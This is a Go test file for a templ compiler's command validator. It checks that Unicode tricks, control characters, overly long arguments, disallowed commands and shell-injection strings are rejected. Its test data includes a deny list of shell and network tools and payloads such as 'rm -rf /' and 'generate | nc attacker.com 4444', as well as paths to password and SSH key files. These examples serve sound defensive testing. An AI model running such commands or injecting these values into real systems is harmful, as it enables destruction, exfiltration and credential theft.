package build

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/conneroisu/templar/internal/types"
	"github.com/stretchr/testify/assert"
)

// TestCompiler_UnicodeSecurityAttacks validates protection against various Unicode-based attacks
func TestCompiler_UnicodeSecurityAttacks(t *testing.T) {

	t.Run("homoglyph attacks", func(t *testing.T) {
		// Test homoglyph attacks where visually similar characters are used to deceive
		homoglyphAttacks := []struct {
			name   string
			input  string
			reason string
		}{
			{
				name:   "cyrillic o instead of latin o",
				input:  "gо", // Contains Cyrillic 'о' (U+043E) instead of Latin 'o' (U+006F)
				reason: "Cyrillic characters in command should be rejected",
			},
			{
				name:   "greek alpha instead of latin a",
				input:  "αrgs", // Contains Greek α (U+03B1) instead of Latin 'a'
				reason: "Greek characters in command arguments should be rejected",
			},
			{
				name:   "mathematical bold characters",
				input:  "𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞", // Mathematical bold 'generate'
				reason: "Mathematical Unicode blocks should be rejected",
			},
			{
				name:   "fullwidth characters",
				input:  "ｇｅｎｅｒａｔｅ", // Fullwidth Latin characters
				reason: "Fullwidth characters should be rejected",
			},
		}

		for _, attack := range homoglyphAttacks {
			t.Run(attack.name, func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{attack.input},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, attack.reason)
				assert.Contains(
					t,
					err.Error(),
					"invalid argument",
					"Should identify as invalid argument",
				)
			})
		}
	})

	t.Run("bidirectional text attacks", func(t *testing.T) {
		// Test bidirectional text attacks using RLO/LRO/PDF characters
		bidiAttacks := []struct {
			name   string
			input  string
			reason string
		}{
			{
				name:   "right-to-left override",
				input:  "generate\u202E--help", // Contains RLO character (U+202E)
				reason: "Right-to-left override characters should be rejected",
			},
			{
				name:   "left-to-right override",
				input:  "generate\u202D--malicious", // Contains LRO character (U+202D)
				reason: "Left-to-right override characters should be rejected",
			},
			{
				name:   "pop directional formatting",
				input:  "generate\u202C--hidden", // Contains PDF character (U+202C)
				reason: "Pop directional formatting characters should be rejected",
			},
			{
				name:   "right-to-left isolate",
				input:  "generate\u2067--isolate", // Contains RLI character (U+2067)
				reason: "Right-to-left isolate characters should be rejected",
			},
		}

		for _, attack := range bidiAttacks {
			t.Run(attack.name, func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{attack.input},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, attack.reason)
			})
		}
	})

	t.Run("zero-width character attacks", func(t *testing.T) {
		// Test attacks using zero-width characters that can hide malicious content
		zeroWidthAttacks := []struct {
			name   string
			input  string
			reason string
		}{
			{
				name:   "zero-width space",
				input:  "generate\u200B--help", // Contains ZWSP (U+200B)
				reason: "Zero-width space should be rejected",
			},
			{
				name:   "zero-width non-joiner",
				input:  "generate\u200C--option", // Contains ZWNJ (U+200C)
				reason: "Zero-width non-joiner should be rejected",
			},
			{
				name:   "zero-width joiner",
				input:  "generate\u200D--flag", // Contains ZWJ (U+200D)
				reason: "Zero-width joiner should be rejected",
			},
			{
				name:   "word joiner",
				input:  "generate\u2060--hidden", // Contains WJ (U+2060)
				reason: "Word joiner should be rejected",
			},
			{
				name:   "invisible separator",
				input:  "generate\u2062--invisible", // Contains invisible times (U+2062)
				reason: "Invisible separator should be rejected",
			},
		}

		for _, attack := range zeroWidthAttacks {
			t.Run(attack.name, func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{attack.input},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, attack.reason)
			})
		}
	})

	t.Run("normalization attacks", func(t *testing.T) {
		// Test attacks that exploit Unicode normalization differences
		normalizationAttacks := []struct {
			name   string
			input  string
			reason string
		}{
			{
				name:   "precomposed vs decomposed",
				input:  "generate\u00E9", // é as precomposed character
				reason: "Non-ASCII characters should be rejected",
			},
			{
				name:   "combining characters",
				input:  "generate\u0065\u0301", // e + combining acute accent
				reason: "Combining characters should be rejected",
			},
			{
				name:   "ligature injection",
				input:  "generate\uFB03", // ffi ligature (U+FB03)
				reason: "Ligature characters should be rejected",
			},
		}

		for _, attack := range normalizationAttacks {
			t.Run(attack.name, func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{attack.input},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, attack.reason)
			})
		}
	})

	t.Run("control character attacks", func(t *testing.T) {
		// Test various control characters that could be used maliciously
		controlAttacks := []struct {
			name   string
			input  string
			reason string
		}{
			{
				name:   "null byte injection",
				input:  "generate\x00--malicious",
				reason: "Null bytes should be rejected",
			},
			{
				name:   "line feed injection",
				input:  "generate\n--help",
				reason: "Line feed characters should be rejected",
			},
			{
				name:   "carriage return injection",
				input:  "generate\r--help",
				reason: "Carriage return characters should be rejected",
			},
			{
				name:   "tab injection",
				input:  "generate\t--help",
				reason: "Tab characters should be rejected",
			},
			{
				name:   "vertical tab injection",
				input:  "generate\v--help",
				reason: "Vertical tab should be rejected",
			},
			{
				name:   "form feed injection",
				input:  "generate\f--help",
				reason: "Form feed should be rejected",
			},
			{
				name:   "bell character",
				input:  "generate\a--help",
				reason: "Bell character should be rejected",
			},
			{
				name:   "backspace",
				input:  "generate\b--help",
				reason: "Backspace character should be rejected",
			},
		}

		for _, attack := range controlAttacks {
			t.Run(attack.name, func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{attack.input},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, attack.reason)
			})
		}
	})
}

// TestCompiler_ResourceLimits validates that the compiler has proper resource limits
func TestCompiler_ResourceLimits(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping resource limit tests in short mode")
	}

	t.Run("argument length limits", func(t *testing.T) {
		// Test extremely long arguments that could cause memory issues
		testCases := []struct {
			name      string
			argLength int
			reason    string
		}{
			{
				name:      "moderately long argument",
				argLength: 1000,
				reason:    "Should handle reasonably long arguments",
			},
			{
				name:      "very long argument",
				argLength: 10000,
				reason:    "Should reject extremely long arguments",
			},
			{
				name:      "excessive argument",
				argLength: 100000,
				reason:    "Should reject arguments that could cause memory issues",
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				longArg := strings.Repeat("a", tc.argLength)
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{longArg},
				}

				err := testCompiler.validateCommand()

				if tc.argLength >= 10000 {
					// Very long arguments should be rejected
					assert.Error(t, err, tc.reason)
				} else {
					// Moderate length should pass basic validation
					// (may still fail on dangerous characters, but not on length alone)
					// Since our test uses only 'a' characters, it should pass validation
					assert.NoError(t, err, tc.reason)
				}
			})
		}
	})

	t.Run("argument count limits", func(t *testing.T) {
		// Test large numbers of arguments
		testCases := []struct {
			name     string
			argCount int
			reason   string
		}{
			{
				name:     "reasonable argument count",
				argCount: 10,
				reason:   "Should handle reasonable number of arguments",
			},
			{
				name:     "many arguments",
				argCount: 100,
				reason:   "Should handle many arguments",
			},
			{
				name:     "excessive arguments",
				argCount: 1000,
				reason:   "Should handle large number of arguments without crashing",
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				args := make([]string, tc.argCount)
				for i := 0; i < tc.argCount; i++ {
					args[i] = fmt.Sprintf("arg%d", i)
				}

				testCompiler := &TemplCompiler{
					command: "templ",
					args:    args,
				}

				// Validation should complete without hanging or crashing
				start := time.Now()
				err := testCompiler.validateCommand()
				duration := time.Since(start)

				// Should complete within reasonable time (no timeout/hanging)
				assert.Less(t, duration, 5*time.Second, "Validation should complete quickly")

				// The validation itself should succeed (args are simple)
				assert.NoError(t, err, tc.reason)
			})
		}
	})

	t.Run("memory exhaustion protection", func(t *testing.T) {
		// Test that validation doesn't consume excessive memory
		t.Run("repeated validation calls", func(t *testing.T) {
			// Create compiler with moderate complexity
			testCompiler := &TemplCompiler{
				command: "templ",
				args:    []string{"generate", "test.templ", "--output", "output.go"},
			}

			// Run validation many times to check for memory leaks
			iterations := 10000
			for i := 0; i < iterations; i++ {
				err := testCompiler.validateCommand()
				assert.NoError(t, err, "Validation should succeed on iteration %d", i)

				// Check periodically to avoid excessive test time
				if i%1000 == 0 {
					// Force garbage collection to catch memory issues
					if i > 0 {
						// Small delay to allow observation of memory usage
						time.Sleep(1 * time.Millisecond)
					}
				}
			}
		})
	})

	t.Run("concurrent validation safety", func(t *testing.T) {
		// Test that concurrent validation calls are safe
		var wg sync.WaitGroup
		concurrency := 50
		iterations := 100

		errChan := make(chan error, concurrency*iterations)

		for i := 0; i < concurrency; i++ {
			wg.Add(1)
			go func(workerID int) {
				defer wg.Done()

				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{"generate", fmt.Sprintf("worker_%d.templ", workerID)},
				}

				for j := 0; j < iterations; j++ {
					err := testCompiler.validateCommand()
					if err != nil {
						errChan <- fmt.Errorf("worker %d iteration %d: %w", workerID, j, err)
					}
				}
			}(i)
		}

		// Wait for all goroutines to complete
		wg.Wait()
		close(errChan)

		// Check for any errors
		var errors []error
		for err := range errChan {
			errors = append(errors, err)
		}

		assert.Empty(t, errors, "Concurrent validation should not produce errors")
	})

	t.Run("timeout protection", func(t *testing.T) {
		// Test that validation operations complete within reasonable time
		testCompiler := &TemplCompiler{
			command: "templ",
			args:    []string{"generate"},
		}

		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
		defer cancel()

		done := make(chan error, 1)
		go func() {
			done <- testCompiler.validateCommand()
		}()

		select {
		case err := <-done:
			assert.NoError(t, err, "Validation should complete successfully")
		case <-ctx.Done():
			t.Error("Validation took too long and timed out")
		}
	})
}

// TestCompiler_UnicodeNormalization tests Unicode normalization edge cases
func TestCompiler_UnicodeNormalization(t *testing.T) {

	t.Run("invalid UTF-8 sequences", func(t *testing.T) {
		// Test various invalid UTF-8 byte sequences
		invalidUTF8 := []struct {
			name   string
			bytes  []byte
			reason string
		}{
			{
				name:   "truncated UTF-8",
				bytes:  []byte{0xC0}, // Incomplete 2-byte sequence
				reason: "Truncated UTF-8 should be rejected",
			},
			{
				name:   "invalid start byte",
				bytes:  []byte{0xFF, 0xFE}, // Invalid start bytes
				reason: "Invalid UTF-8 start bytes should be rejected",
			},
			{
				name:   "overlong encoding",
				bytes:  []byte{0xC0, 0x80}, // Overlong encoding of null byte
				reason: "Overlong UTF-8 encoding should be rejected",
			},
			{
				name:   "continuation without start",
				bytes:  []byte{0x80, 0x80}, // Continuation bytes without start
				reason: "Invalid UTF-8 continuation should be rejected",
			},
		}

		for _, test := range invalidUTF8 {
			t.Run(test.name, func(t *testing.T) {
				// Convert bytes to string (may contain invalid UTF-8)
				invalidString := string(test.bytes)

				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{invalidString},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, test.reason)
			})
		}
	})

	t.Run("UTF-8 validity checks", func(t *testing.T) {
		testCases := []struct {
			name    string
			input   string
			isValid bool
			reason  string
		}{
			{
				name:    "valid ASCII",
				input:   "generate",
				isValid: true,
				reason:  "Valid ASCII should be accepted",
			},
			{
				name:    "valid UTF-8 but non-ASCII",
				input:   "générér", // French accented characters
				isValid: false,     // Should be rejected by our validation
				reason:  "Non-ASCII characters should be rejected for security",
			},
			{
				name:    "replacement character",
				input:   "generate\uFFFD", // Unicode replacement character
				isValid: false,
				reason:  "Replacement character should be rejected",
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				// Verify our test input is valid UTF-8 where expected
				if tc.isValid {
					assert.True(t, utf8.ValidString(tc.input), "Test input should be valid UTF-8")
				}

				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{tc.input},
				}

				err := testCompiler.validateCommand()

				if tc.isValid {
					assert.NoError(t, err, tc.reason)
				} else {
					assert.Error(t, err, tc.reason)
				}
			})
		}
	})
}

// TestCompiler_SecurityBoundaries tests security boundary enforcement
func TestCompiler_SecurityBoundaries(t *testing.T) {
	t.Run("command allowlist enforcement", func(t *testing.T) {
		// Test that only specific commands are allowed
		disallowedCommands := []string{
			"rm", "mv", "cp", "chmod", "chown", "sudo", "su",
			"curl", "wget", "nc", "netcat", "ssh", "scp",
			"python", "python3", "node", "ruby", "perl",
			"sh", "bash", "zsh", "fish", "csh", "tcsh",
			"powershell", "cmd", "command",
			"/bin/sh", "/bin/bash", "/usr/bin/python",
		}

		for _, cmd := range disallowedCommands {
			t.Run(fmt.Sprintf("disallowed_%s", cmd), func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: cmd,
					args:    []string{"test"},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, "Command %s should be disallowed", cmd)
				assert.Contains(
					t,
					err.Error(),
					"not allowed",
					"Error should indicate command is not allowed",
				)
			})
		}
	})

	t.Run("argument sanitization", func(t *testing.T) {
		// Test that dangerous argument patterns are rejected
		dangerousPatterns := []string{
			"--help; rm -rf /",
			"$(whoami)",
			"`id`",
			"${PATH}",
			"$((2+2))",
			"'touch /tmp/hack'",
			"\"echo hacked\"",
			"generate | nc attacker.com 4444",
			"generate && curl evil.com",
			"generate || echo pwned",
		}

		for _, pattern := range dangerousPatterns {
			t.Run(fmt.Sprintf("dangerous_pattern_%s", pattern), func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{pattern},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, "Dangerous pattern should be rejected: %s", pattern)
			})
		}
	})

	t.Run("path validation", func(t *testing.T) {
		// Test path-related security checks
		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"/proc/self/mem",
			"/dev/null",
			"/sys/class/mem/null",
			"~/.ssh/authorized_keys",
			"%USERPROFILE%\\.ssh\\id_rsa",
			"./../../sensitive",
		}

		for _, path := range maliciousPaths {
			t.Run(fmt.Sprintf("malicious_path_%s", path), func(t *testing.T) {
				testCompiler := &TemplCompiler{
					command: "templ",
					args:    []string{path},
				}

				err := testCompiler.validateCommand()
				assert.Error(t, err, "Malicious path should be rejected: %s", path)
			})
		}
	})
}

// TestCompiler_CompileResourceLimits tests resource limits during actual compilation
func TestCompiler_CompileResourceLimits(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping compile resource limit tests in short mode")
	}

	t.Run("compilation timeout protection", func(t *testing.T) {
		// Test that compilation operations have reasonable timeouts
		compiler := &TemplCompiler{
			command: "sleep",        // Use sleep command to simulate long-running process
			args:    []string{"10"}, // 10 seconds
		}

		component := &types.ComponentInfo{
			Name:     "TestComponent",
			FilePath: "test.templ",
			Package:  "test",
		}

		start := time.Now()

		// This should fail quickly due to command validation (sleep is not allowed)
		_, err := compiler.Compile(context.Background(), component)

		duration := time.Since(start)

		// Should fail fast due to validation, not timeout
		assert.Error(t, err, "Should reject disallowed command")
		assert.Less(t, duration, 1*time.Second, "Should fail quickly due to validation")
		assert.Contains(t, err.Error(), "not allowed", "Should indicate command not allowed")
	})

	t.Run("memory usage during compilation", func(t *testing.T) {
		// Test memory-conscious compilation with pools
		pools := NewObjectPools()
		compiler := NewTemplCompiler()

		component := &types.ComponentInfo{
			Name:     "TestComponent",
			FilePath: "test.templ",
			Package:  "test",
		}

		// Run multiple compilations to test memory reuse
		for i := 0; i < 10; i++ {
			// This will likely fail since we're not in a proper templ project,
			// but it shouldn't cause memory issues
			output, err := compiler.CompileWithPools(context.Background(), component, pools)

			if err != nil {
				// Expected to fail in test environment, but should handle gracefully
				assert.Contains(t, err.Error(), "templ generate failed")
				assert.Nil(t, output)
			}
		}
	})
}

// TestCompiler_EdgeCaseHandling tests various edge cases and error conditions
func TestCompiler_EdgeCaseHandling(t *testing.T) {
	t.Run("nil component handling", func(t *testing.T) {
		compiler := NewTemplCompiler()

		// Test with nil component
		_, err := compiler.Compile(context.Background(), nil)

		// Should either handle gracefully or provide meaningful error
		// The actual implementation may or may not check for nil
		if err != nil {
			assert.NotEmpty(t, err.Error(), "Error message should not be empty")
		}
	})

	t.Run("empty component handling", func(t *testing.T) {
		compiler := NewTemplCompiler()
		emptyComponent := &types.ComponentInfo{}

		_, err := compiler.Compile(context.Background(), emptyComponent)

		// Should handle empty component gracefully
		if err != nil {
			assert.NotEmpty(t, err.Error(), "Error message should not be empty")
		}
	})

	t.Run("component with special characters", func(t *testing.T) {
		compiler := NewTemplCompiler()

		// Test component with Unicode in name/path
		unicodeComponent := &types.ComponentInfo{
			Name:     "Test🚀Component",
			FilePath: "test_émojï.templ",
			Package:  "tëst",
		}

		_, err := compiler.Compile(context.Background(), unicodeComponent)

		// Should complete without crashing
		if err != nil {
			assert.NotEmpty(t, err.Error(), "Error message should not be empty")
		}
	})

	t.Run("very long component names", func(t *testing.T) {
		compiler := NewTemplCompiler()

		longName := strings.Repeat("VeryLongComponentName", 100)
		longComponent := &types.ComponentInfo{
			Name:     longName,
			FilePath: "test.templ",
			Package:  "test",
		}

		_, err := compiler.Compile(context.Background(), longComponent)

		// Should handle long names without crashing
		if err != nil {
			assert.NotEmpty(t, err.Error(), "Error message should not be empty")
		}
	})
}

// benchmarkValidateCommand benchmarks the validation performance
func BenchmarkCompiler_ValidateCommand(b *testing.B) {
	compiler := &TemplCompiler{
		command: "templ",
		args:    []string{"generate", "test.templ", "--output", "output.go"},
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		err := compiler.validateCommand()
		if err != nil {
			b.Fatal(err)
		}
	}
}

// benchmarkUnicodeValidation benchmarks Unicode validation performance
func BenchmarkCompiler_UnicodeValidation(b *testing.B) {
	// Test with various Unicode inputs
	testInputs := []string{
		"generate",
		"generate_with_underscores",
		"generate-with-dashes",
		"generateWithCamelCase",
		"generate123WithNumbers",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		input := testInputs[i%len(testInputs)]
		compiler := &TemplCompiler{
			command: "templ",
			args:    []string{input},
		}

		err := compiler.validateCommand()
		if err != nil {
			b.Fatal(err)
		}
	}
}
